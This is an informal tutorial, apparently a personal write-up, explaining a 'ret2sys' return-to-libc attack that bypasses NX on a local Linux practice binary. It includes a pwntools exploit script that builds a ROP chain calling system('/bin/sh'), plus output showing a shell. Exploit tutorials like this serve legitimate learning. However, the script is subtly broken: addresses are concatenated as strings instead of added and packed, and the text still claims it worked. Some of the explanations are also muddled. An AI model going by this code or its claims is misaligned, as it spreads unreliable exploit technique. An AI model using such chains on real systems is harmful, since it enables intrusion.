#Before I get into you can use this exploit, on your own linux binaries just so long as you have the same kernel and libc version as I do. 

What ret2sys is & and what it's for:

So there are many ways to end up bypassing the binary security "NX" (non-excutable) this form of security limits the ability to execute code you can execute code
on the stack. So basically NX/DEP (NX for linux and DEP for windows) works like how file permissions work, regions of memory in binaries also have permissions. So
the ability to read on arbitrarily from the stack can be stopped, same with with writing and executing which is what NX is, it's non-excutable stacks.
You can get around said binary security using a exploit attacks known as "Ret2Sys" and "Ret2libc" but im going to go over ret2sys which is very similiar to ret2libc.
This differs from ret2libc in the way such as with ret2sys you aren't looking for ways to rebulid your stack with assembler code with the binary you are given.
You are basically structuring together addresses to form a payload from said addresses by locating addresses to things in memory. As I said ret2libc and ret2sys
which are ROP (Return oriented programming) attack exploits are very similiar but a little bit different in terms of how you structure your python, perl or ruby
exploits. Now like I said ret2sys attacks are interesting because you don't summon a shell with a payload and shellcode/byte-code you use the /bin/sh string or hex
representation of the string at least is what's used to summon a shell.

Let's go ahead and break down what libc is and system and exit functions:

So before we can get into how to exploit system() and exit() let's explain what those are. So in libc
(the base linux C library) there lay 2 functions called system and exit, and exit just basically exits the process
that's being ran. Now the system function can be used to summon and use shell commands and spawn child
processes, so you can summon a shell with it.

Now I will show my ret2sys exploit and break it down.
----------------------------------------------------------------------------------------------------------------------------------------------------------------------->from pwn import *

#padding
rip_offset = 273
padding = "A" * rip_offset

#offests for system and exit
#(0x0000000000044be0)
#(0x00000000000503c0)

#addrs
libc_base_addr = ("0x00007ffff7dc9000")
libc_system = ("0x00007ffff7dc9000" + "0x00000000000503c0")
libc_exit = ("0x00007ffff7dc9000" + "0x0000000000044be0")
binsh_addr = ("0x7ffff7f7741f")
pop_rdi_ret = ("0x00000000004011d3")

#So we need our libc_base so we can add the offset of system and exit with the base to get an address for system and exit.

#payload
payload = padding + pop_rdi_ret + binsh_addr + libc_system + libc_exit

#print(hex(libc_system))
#print(hex(libc_exit))
#You can do this to see if you get a prop system and exit addr

#Setting up our pwntools for our processes
proc = process("./vuln_bin")  #My binary name
proc.sendline(payload)        #Sending my payload
proc.interactive()            #Making my shell interactive

#Some tools I used were the pwntools python module, the ropgadget tool to get my pop_rdi ; ret instruction, and I used ldd and readelf to get my libc_base and the
#offsets for libc_system and libc_exit, I also used a gdb (GNU linux command line debugger) plugin known as "gef" which is what I used to find the offset for the
#RIP address and was able to cause segmentation faults to get a offset.
----------------------------------------------------------------------------------------------------------------------------------------------------------------------

So upon executing this in your shell with the usage like so: python3 (exploit_name).py your interface in your shell should look like this upon running:

laytathagod@pop-s ~D/B/rop> python3 exploit.py
[!] Could not find executable 'vuln_bin' in $PATH using './vuln_bin' instead
[+] starting local process './vuln_bin': pid 5458
[*] Switching to interactive mode
$

We have successfully summoned a shell and bypassed NX without ALSR using a ret2sys attack! 
